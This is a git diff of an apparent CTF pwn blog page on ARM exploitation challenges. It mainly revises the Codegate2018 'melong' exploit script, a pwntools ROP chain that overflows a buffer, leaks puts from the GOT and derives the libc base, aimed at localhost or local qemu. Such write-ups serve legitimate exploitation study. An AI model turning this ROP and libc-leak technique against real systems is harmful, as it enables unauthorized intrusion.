@@ -69,7 +69,7 @@
 
 <meta itemprop="datePublished" content="2018-07-31T20:00:54&#43;08:00" />
 <meta itemprop="dateModified" content="2018-07-31T20:00:54&#43;08:00" />
-<meta itemprop="wordCount" content="5662">
+<meta itemprop="wordCount" content="5686">
 
 
 
@@ -313,7 +313,7 @@
             <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
             
           </div>
-        <span class="more-meta"> 5662 words </span>
+        <span class="more-meta"> 5686 words </span>
           <span class="more-meta"> 12 min read </span>
 
         
@@ -619,7 +619,7 @@ pwndbg&gt; target remote localhost:1234</code></pre></td></tr></table>
 
 <h2 id="jarvis-oj-typo">Jarvis oj - typo</h2>
 
-<p><a href="https://github.com/0x01f/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>
+<p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>
 
 <h3 id="静态分析">静态分析</h3>
 <div class="highlight"><div class="chroma">
@@ -974,7 +974,7 @@ pwndbg&gt; cyclic -l 0x62616164
 </div>
 <h2 id="codegate2018-melong">Codegate2018 - melong</h2>
 
-<p><a href="https://github.com/0x01f/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>
+<p><a href="https://github.com/bash-c/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>
 
 <h3 id="静态分析-1">静态分析</h3>
 <div class="highlight"><div class="chroma">
@@ -1061,25 +1061,32 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="lnt">53
 </span><span class="lnt">54
 </span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
-<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./melong&#34;</span>
 
 <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
     <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
 <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;./&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
 <span class="k">else</span><span class="p">:</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;./&#34;</span><span class="p">,</span> <span class="s2">&#34;./melong&#34;</span><span class="p">])</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./melong&#34;</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./melong&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./lib/libc.so.6&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
 
 <span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">height</span><span class="p">,</span> <span class="n">weight</span><span class="p">):</span>
@@ -1093,7 +1100,7 @@ pwndbg&gt; cyclic -l 0x62616164
 
 <span class="k">def</span> <span class="nf">write_diray</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span>
@@ -1105,11 +1112,18 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="s1">    0x00011bbc : pop {r0, pc}
 </span><span class="s1">    &#39;&#39;&#39;</span>
     <span class="n">pr0</span> <span class="o">=</span> <span class="mh">0x00011bbc</span>
-    <span class="n">leak</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pr0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">8</span>
+    <span class="n">leak</span>  <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x54</span><span class="p">),</span> <span class="n">pr0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
+    <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">    pwndbg&gt; x/i $pc
+</span><span class="s1">    =&gt; 0xff6a7a48 &lt;puts+400&gt;:	pop	{r4, r5, r6, r7, r8, r9, r10, pc}
+</span><span class="s1">    &#39;&#39;&#39;</span>
+    <span class="n">leak</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">8</span>
     <span class="n">write_diray</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
     <span class="n">logout</span><span class="p">()</span>
-    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf6</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:</span> <span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;See you again :)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
     <span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="c1">#  raw_input(&#34;DEBUG: &#34;)</span>
 
     <span class="n">check</span><span class="p">(</span><span class="mf">1.82</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
     <span class="n">PT</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
@@ -1121,6 +1135,8 @@ pwndbg&gt; cyclic -l 0x62616164
 </div>
 </div>
 <h2 id="shanghai2018-baby-arm">Shanghai2018 - baby_arm</h2>
+
+<p><a href="https://github.com/bash-c/pwn_repo/tree/master/Shanghai2018_baby_arm">binary &amp; exploit here</a></p>
 
 <h3 id="静态分析-2">静态分析</h3>
 
@@ -1435,7 +1451,6 @@ Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> 
 <ul>
 <li>后来了解到，对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</li>
 </ul></li>
-<li>我的 melong 的 exp 是有问题的, 暂待解决</li>
 </ul>
 
 <h2 id="后记">后记</h2>
